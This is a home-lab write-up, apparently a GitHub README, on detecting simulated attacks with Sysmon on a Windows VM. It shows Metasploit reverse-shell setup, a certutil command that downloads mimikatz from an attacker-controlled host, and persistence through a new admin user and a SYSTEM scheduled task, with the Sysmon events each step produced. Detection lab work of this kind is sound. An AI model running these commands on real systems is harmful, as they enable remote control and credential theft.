# Windows Sysmon Detection

### Scenario:

In my virtualized environment, I will be simulating a series of attacks on a victim machine (Win OS) to assess the effectiveness and analyze how Sysmon logs capture malicious activities. The goal is to test multiple attack vectors and analyze the corresponding events generated by Sysmon.

### Tools and Technology:

Mimikatz, Sysmon, Win OS, Linux OS, MSFVenom, and Metasploit

### Topology:

![Pasted image 20250126082653](https://github.com/user-attachments/assets/224d8e74-1e82-49c0-9ed0-f2808814f5c8)

## Sysmon

Sysmon is a tool from Microsoftâ€™s Sysinternals suite that helps to monitor and log various activities on a Windows computer.  It collects detailed information about what's happening on the host, like when programs run, when network connections are made, and other important system activities. This can help you identify security threats or troubleshoot performance problems.

Some of the features include:
+ Process Creation Logging
+ Network Connection Monitoring
+ File Creation Time Monitoring
+ Driver and DLL Loading
+ Registry Changes
+ Event Correlation

To start, I downloaded Sysmon:
https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon

![Pasted image 20250118082848](https://github.com/user-attachments/assets/f5a88b35-99a3-4ead-a9db-f779a48ec2c0)

Once downloaded, I began the installation:

![Pasted image 20250118085416](https://github.com/user-attachments/assets/130312ed-b1a3-44ea-9b05-29be256fd9c3)

This is the command that ran to install and accept the licensing terms:

```
.\Sysmon.exe -i .\sysmonconfig-export.xml -accepteula
```

![Pasted image 20250118085609](https://github.com/user-attachments/assets/a6588ebd-93f4-4ab6-be25-de7b1dcf31d8)

I then verified that Sysmon was running by checking the service:

![Pasted image 20250118085841](https://github.com/user-attachments/assets/3c75ef8d-5fbe-4747-8df4-468cbb18beda)

![Pasted image 20250118085800](https://github.com/user-attachments/assets/c366b6f6-ed9f-4d59-9774-823717ebe1c2)

I also reviewed the logs:

![Pasted image 20250118090333](https://github.com/user-attachments/assets/047e3bb2-145c-447f-80b3-2a1b931e340a)

> [!NOTE]  
> The Sysmon logs are under Applications and Services > Microsoft > Windows > Sysmon, Operational.

![Pasted image 20250118090501](https://github.com/user-attachments/assets/422e0505-5a6e-424b-a165-1fb669094ab2)

![Pasted image 20250118090826](https://github.com/user-attachments/assets/878c8d40-2ada-4195-b52d-54dcc421abbe)

### Reverse TCP Payload:

Now that the target host has Sysmon installed, I am going to test its logging capabilities. To do this, I created a TCP reverse shell payload using MSFVenom. A reverse TCP payload is a type of malicious payload where the target machine (victim) connects back to the attacker's system over a TCP connection, allowing the attacker to control the victim machine remotely.

I used the target host to download the payload as seen below:

![Pasted image 20250118093243](https://github.com/user-attachments/assets/6e001656-2153-4283-86dd-b609b2b8bccc)

Once downloaded, I executed the reverse shell payload:

![Pasted image 20250118091251](https://github.com/user-attachments/assets/d9ec2de4-eb03-4bd9-b283-5d0ea1d4054f)

Upon executing it, I took a look at the process logs that were generated by Sysmon:

![Pasted image 20250118091645](https://github.com/user-attachments/assets/f3051fde-42e3-419d-8e0c-dac36e976dc7)

I also filtered for the network traffic:

![Pasted image 20250118093557](https://github.com/user-attachments/assets/ee45d337-ab75-40c2-b1b3-f3ca64324729)

As seen above, the reverse shell was executed successfully. Next, I went ahead and executed a command to generate more logs:

![Pasted image 20250118141616](https://github.com/user-attachments/assets/64c076ea-1aff-4e7b-89ad-56290fc5e564)

Right away I was able to see that Sysmon was able to capture this action in the logs:

![Pasted image 20250118141833](https://github.com/user-attachments/assets/f7e2b24f-4b01-4056-b08a-24b4795f4676)

### HTTP Reverse Shell:

To further test, I generated a HTTP reverse shell. A HTTP reverse shell is a shell where the target machine (victim) connects back to an attacker's server over HTTP, allowing the attacker to control the target system remotely. Below are the commands I used:

```
msfconsole -q
set LHOST 192.168.1.128
set LHOST 5555
```

![Pasted image 20250118142629](https://github.com/user-attachments/assets/82340df4-ba7f-4f0f-8927-f6d16b768fb2)

```
generate -f exe -o http_lm3nitro.exe
exploit
```

![Pasted image 20250118143149](https://github.com/user-attachments/assets/89892630-18c3-425f-90f2-0890acc92cc5)

This is the HTTP payload that I created:

![Pasted image 20250118142916](https://github.com/user-attachments/assets/2e6e7870-ed66-477c-a744-42db8b12a58b)

After that payload was created, I then went to the target Windows host and download the HTTP payload:

![Pasted image 20250118143658](https://github.com/user-attachments/assets/de2f695e-dc52-4491-a9df-9779504d227d)

After downloading the HTTP payload, I executed it:

![Pasted image 20250118144048](https://github.com/user-attachments/assets/bd7222ad-422d-4e1c-8088-14c65a8eec99)

Listing the sessions:

```
sessions
```

Selecting a session:

```
sessions -i 1
```

On the left side I can see the active meterpreter reverse HTTP session and the network traffic. On the right side are the sysmon logs related to file creation and network traffic:

![Pasted image 20250118145143](https://github.com/user-attachments/assets/5bbf4863-b543-4726-a1ba-cd5c652d1dfa)

I was then able to perform some enumeration on the target host:

```
whoami
hostname
systeminfo
```
![Pasted image 20250118150337](https://github.com/user-attachments/assets/6ca3138c-65e7-408d-b6ca-d9119b0d3e23)

To maintain persistence, I created a user and assigned the user to the administrator group:

```
net user attacker password /add
net local group Administrator attacker /add
```

![Pasted image 20250118150309](https://github.com/user-attachments/assets/467b6e71-8848-44c3-8003-6d0628a5fcff)

Looking at the Sysmon logs and event activity, I was able to see the information about the account creation and the assignment to the administrator group:

![Pasted image 20250118151023](https://github.com/user-attachments/assets/53bfb39e-aefe-45e6-9d25-45dbb6ccea70)

## Mimikatz

As a final test, I will also be using mimikatz. Mimikatz is a powerful, open-source tool primarily used for testing the security of Windows environments. It is often used to demonstrate how attackers can extract sensitive information from memory, like plaintext passwords, password hashes, Kerberos tickets, and other authentication data.

To get started, I downloaded mimikatz:

![Pasted image 20250118152854](https://github.com/user-attachments/assets/0700249b-d761-4947-9f02-d85a2f99bba2)

Next, I used the target to download the malware from c2 server (my own attacking node):

```
certutil -urlcache -split -f "http://192.168.1.128:8080/mimikatz/x64/mimikatz.exe" C:\Users\soc\Desktop\lm3nitro\lm3nitro_mimikatz.exe
```

![Pasted image 20250118155016](https://github.com/user-attachments/assets/0fedd902-83c7-4f20-9b2d-79ea51e7ab17)

Looking at the logs, I can see that downloading the malware generated a process creation:

![Pasted image 20250118162259](https://github.com/user-attachments/assets/df646034-bef8-4012-8e77-891db243caf8)

I could also see that a network connection was detected, and in looking at the details I can see that it is to my attacking host (c2 server):

![Pasted image 20250118162007](https://github.com/user-attachments/assets/09990685-eba2-45d0-b19c-6a16dd36f569)

After downloading the malware, I created a scheduled task on the target/victim host to maintain the HTTP reverse shell:

```
schtasks /create /tn "lm3nitro_backdoor_task" /tr "C:\Users\soc\Desktop\lm3nitro\http_lm3nitro.exe" /sc onlogon /ru SYSTEM
```

![Pasted image 20250118155635](https://github.com/user-attachments/assets/a016917f-24c0-4419-adf0-52dcaf419267)

Below are the logs generated from the scheduled task creation:

![Pasted image 20250118161613](https://github.com/user-attachments/assets/fbed33b4-2004-4616-87c9-90a2a73d8a85)

Now that the HTTP reverse shell task was created and the target host had already downloaded the malware, I executed it:

![Pasted image 20250118160503](https://github.com/user-attachments/assets/db354a5d-a524-4a67-a11d-52acf772c947)

Based on the output above, the execution was successful. I also used VirusTotal to verify the malware as seen below:

https://www.virustotal.com/gui/file/92804faaab2175dc501d73e814663058c78c0a042675a8937266357bcfb96c50

![Pasted image 20250118161030](https://github.com/user-attachments/assets/be556b69-e6fd-4c20-a203-8b78b0008063)

Here I can see that the executable that the target host/victim downloaded was indeed malicious and I could also see the execution in Sysmon. 

### Conclusion:

By performing these series of simulated attacks, I was able to gain insight into how different types of reverse shells (TCP and HTTP) function and how they can be used to establish persistence on a compromised system. This exercise also allowed me to test and see how Sysmon can be configured to capture critical events such as process creation and network connections, offering valuable visibility into attack activities. 

Additionally, it revealed the importance of network monitoring and logging in order to detect unusual outbound connections, which are common in reverse shell attacks. 
